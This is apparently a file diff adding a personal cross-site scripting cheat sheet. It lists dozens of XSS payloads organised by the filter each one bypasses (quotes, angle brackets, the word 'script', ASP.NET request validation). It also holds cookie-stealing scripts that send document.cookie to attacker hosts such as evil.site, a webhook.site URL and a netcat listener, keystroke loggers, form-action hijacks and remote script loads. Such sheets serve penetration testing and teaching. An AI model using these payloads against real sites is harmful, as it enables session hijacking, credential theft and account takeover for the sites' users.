@@ -1,0 +1,265 @@
+XSS CheatSheet? - http://ha.ckers.org/xss.html
+
+http://www.secureideas.net/tools
+
+
+
+Original	Replacement
+		Name	Dec	Hex
+———		————	———	———
+"		&quot;	&#34;	&#x22;
+&		&amp;	&#38;	&#x26;
+'		&apos;	&#39;	&#x27;
+<		&lt;	&#60;	&#x3c;
+>		&gt;	&#62;	&#x3e;
+Examples:
+	Basic XSS, no filters applied
+	<script>alert("Hello World")</script>
+	"><script>alert(1)</script>
+	
+	XSS with no ' or " quotes allowed as they are filtered
+	<script>alert(/hello/.source)</script>
+	<script>alert(1)</script>
+	<IMG SRC=javascript:alert(1)>
+	javascript%3aalert(2)%2f%2f
+
+	XSS with no < or > allowed as they are filtered
+	"%3balert(1)//
+	'%3balert(1)//
+	%27%29;alert%281%29;//
+	test%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+	';}alert('xss');function asdf(){a='
+	\x27-confirm`1`-\x27 
+	\u0027-confirm`1`-\u0027 
+
+
+	<html><body><script>alert(1)</script></body></html>
+
+	<a/ondrag=alert()>
+	<x~%0Aonmouseover=alert(1)>AAA
+	test%22+onmouseover%3D%22alert(1)
+	test" onmouseover="alert(1)" fakeattribute="
+		We can also use CSS to expand the input box to cover the entire window:
+		test" onmouseover="alert(1)" style="position:absolute;top:0px;left:0px;width:100%;height:100%" fakeattribute="
+	campaignId=k8bx2" accesskey="y" onclick="alert(1)"//k8bx2
+	
+
+	XSS with the word "script" filtered out:
+	--%3E%3Cimg%20src%3da%20onerror%3dalert%281%29%3E
+	<IMG SRC='a' onerror=alert(1)>
+	<img src=x onerror='alert(1);'/>
+	<video src=1 onerror=alert(1)>
+	<audio src=1 onerror=alert(1)>
+	
+	" onerror="alert(1)" src="4.jpg" type="image
+	"/></a></><img src=f onerror=alert(1)>
+	<body onload="alert(1)">
+	<svg onload="alert(1)"></svg>
+	<svg/onload=alert(/XSS/)>
+	<svg onload=prompt(1)>
+	<x~%0Aonfocus=alert%281%29%20id=a%20tabindex=0>#a
+	"%3balert(1)//
+	";alert(1);//
+	'%3balert(1)//
+	';alert(1);//
+	javascript:alert(1)//
+	javascript%3aalert%281%29%2f%2f
+	");confirm(1);//
+	STYLE= "xss:expression(alert('XSS'))
+	%27%29;alert%281%29;//
+	%27%29;%20alert%28%271%27%29;//
+	test%22%2F%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+	test%3cScRiPt%3ealert(1)%3c%2fScRiPt%3e
+	"-alert(1)-"		
+	%00”-alert(2)-"
+	<div onfocus=alert('xx') id=xss style=display:table>
+	';}alert('xss');function asdf(){a='
+	'<scr'+'ipt>'alert(1)'<\/scr'+'ipt>'
+	<a href="javascript:alert(1)">ClickMe</a>		#works in Markdown!!!
+	onmouseover javascript:decodeURIComponent('%3d')"alert(1)  # %3d is an =
+	<input type="hidden" style="x:expression(alert('XSS'))">
+	<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk7PC9zY3JpcHQ+">
+	<script>x=Function((![]+[]+!![])[1]+(![]+[]+!![])[2]+(![]+[]+!![])[4]+(![]+[]+!![])[6]+(![]+[]+!![])[5]+'(1)')()</script>
+
+	No Parentheses( ), < > or “script”
+	onerror=alert;throw 1;
+	onerror=eval;throw’=alert\x281\x29’;
+	" onclick="javascript:window.onerror=alert;throw 'XSS'" x="
+	" onclick="javascript:window.onerror=alert;throw 'XSS'
+	document.location.href='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=' 
+
+
+	<script>document.write('<img src="https://webhook.site/b373f780-a821-4146-9262-7b565102386d/c='%2bdocument.cookie%2b'" />')</script>
+
+	XSS .NET filter bypass (Server Side)
+	<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(5))>
+	"expre/**/ssion(alert('XSS'))">
+	<%tag style=“css:expression(alert(4))”>
+	"style="x:expr/**/ession(open(alert(1)))"
+	{['toStrin'+x]:[].join,length:1,0:'java\script:alert\x28123\x29',['valueO'+y]:location}-'';
+
+	jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+	a technique for bypassing ASP.NET Request Validation for PXSS:
+	Using unicode for < and >
+	%uff1csvg onload=alert(2)>
+	%UFF1Cscript>alert('XSS')%UFF1C/script>
+	%uff1cscript%uff1ealert(1)%uff1c%2fscript%uff1e
+	\u003cscript\u003ealert(1)\u003c/script\u003e
+
+	\x27-confirm`1`-\x27 
+	\u0027-confirm`1`-\u0027 
+	
+	<script>var q="";~{valueOf:opener.button.click}//"</script>
+	<script>var q="";~{toString:opener.button.click}//"</script>
+
+
+	If the DBMS stores it in a VARCHAR field instead of NVARCHAR, it gets truncated to the ASCII equivalent.
+	Thus turning it into <script>alert('XSS')</script>
+
+	An iFrame using Unicode
+	%UFF1Ciframe>
+
+	
+		';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+
+	font-family:a/**/ression(alert(1))('\')exp\')
+	Works on IE <= 9:
+	<html> <head> </head> <body> <div style="font-family:a/**/ression(alert(666))('\')exp\')">pwn</div> </body> </html>
+
+	XSS to change the action of the resulting form to point to a different location so 
+	that the password is not submitted to the normal place
+	<script>document.forms[1].action="foo.php"</script>
+	
+	XSS to Redirect to another page
+	<script language="javascript">window.location.href = "http://evilsite.org/page.html" ;</script>
+
+	XSS to run script from other server
+	<script src="http://evil.site/bad.js"></script>
+	<script src=bitly.com/oIXm5
+
+	XSS to Put another web site in an iframe:
+	<iframe src="http://www.cnn.com"></iframe>
+
+	XSS Small in a form field  
+	test<IMG SRC='a'>   -> if the word test shows up but the payload does not, you are vuln to XSS
+	
+
+
+Javascript Injection Examples:
+	javascript:alert(document.cookie);
+	javascript:void(document.cookie="Field = myValue");
+
+
+
+	<script>documnet.write('<img src="http://evil.site/'+document.cookie+'">')</script>
+
+	Cookie Catcher ->this code logs the cookies in a simple format.
+
+	Redirect a user -> <script language="javascript">window.location.href = "otherpage.html" ;</script>
+
+	External Scripts -> <script src="http://evil.site/bad.js"></script>
+
+	<IMG SRC="javascript:alert('XSS');">
+	<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+	<IMG SRC="javascript:alert(&quot;XSS&quot;)>
+	<IMG SRC='a' onerror=alert(1)>
+
+
+	Pull local IP address using http://reglos.de/myaddress/ in XSS attack
+
+
+    document.write('<img src='http://myevilsite.com?' + document.cookie + '>');
+ 	This takes the cookie already loaded in my browser and sends it to the "myevilsite.com" 
+	as an image request.
+
+	A simple example of XSS can be seen in the following URL:
+		http://server.example.com/browse.cfm?categoryID=1&name=Books
+
+	In this example the content of the 'name' parameter is displayed on the returned page. 
+	A user could submit the following request:
+		http://server.example.com/browse.cfm?categoryID=1&name=<h1>Books
+
+	If the characters < > are not being correctly stripped or escaped by this application, 
+	the "<h1>" would be returned within the page and would be parsed by the browser as 
+	valid html. 
+	A better example would be as follows:
+		http://server.example.com/browse.cfm?categoryID=1&name=<script>alert(document.cookie);</script>
+
+	In this case, we have managed to inject Javascript into the resulting page. The relevant 
+	cookie (if any) for this session would be displayed in a popup box upon submitting this 
+	request. 
+
+	Requires attacker to input script
+	Then view resulting page
+	For example:
+		Attacker starts netcat listener
+			nc -n -l -p 2222
+		Attacker Posts a message to a forum
+			<script>document.location='http://1.1.1.1:2222/grab.cgi?'+document.cookie;</script>
+				grab.cgi doesn't have to actually exist.  It just needs to be in URI
+		Victim Views the message 
+			Victims cookies are sent to 1.1.1.1 on port 2222
+
+
+	XSS Example in a Message Board
+		<B C=">" onmouseover="alert('Gotcha!')" X="<B ">H E L L O</B>
+			or
+		<B C=">" onmouseover="alert(document.location='http://mysite.org/cookiecatcher.php?'+document.cookie)" X="<B ">H E L L O</B>
+			The code for the php script called cookiecatcher.php.  If it is
+			running you can look in /tmp/cookiedump and see the cookie
+
+
+DOM-based XSS
+	The client uses the URL within the DOM. All attacks are in the URI?!?!
+	Examples of inputs (or sinks) are:
+		cookies
+		the referer
+		dialog inputs	
+		XMLHTTPRequest Responses
+	
+	Example attacks via URI:
+		http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
+		http://www.some.site/page.html#default=<script>alert(document.cookie)</script>
+					      ^
+		
+	Tools: -> DOMinator - firefox extension
+		http://code.google.com/p/dominator
+			it extends firebug to detect D-XSS flaws
+		passive monitoring
+
+Keystroke logging:
+	Form fields -> only grabs the field contents:
+	onblur="javascript:document.write('<img src=//attackert/'+this.value);"
+	
+	OnKeyPress event handling:
+	onkeyup="javascript:document.write('<img src=//attackert/'+this.value);"
+
+
+Code to steal cookies:
+	<script>document.write('
+	   <img src="http://evil.site/'+document.cookie+'">')
+	   </script>
+
+Code to redirect a user
+	<script language="javascript">
+	 window.location.href = "otherpage.html" ;
+	 </script>
+
+Code to change the Form Action to have it submit to us:
+	documnet.forms[1].action="http://www.site.org/"
+
+Code to execute external Script:
+	<script src="http://evil.site/bad.js">
+	  </script>
+
+Evasion Examples:
+	Traditional:
+		<SCRIPT>alert("XSS")</SCRIPT>
+			or
+		<IMG SRC="javascript:alert('XSS');">
+	Malformed
+		<IMG """><SCRIPT>alert("XSS")<SCRIPT>">
+		<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
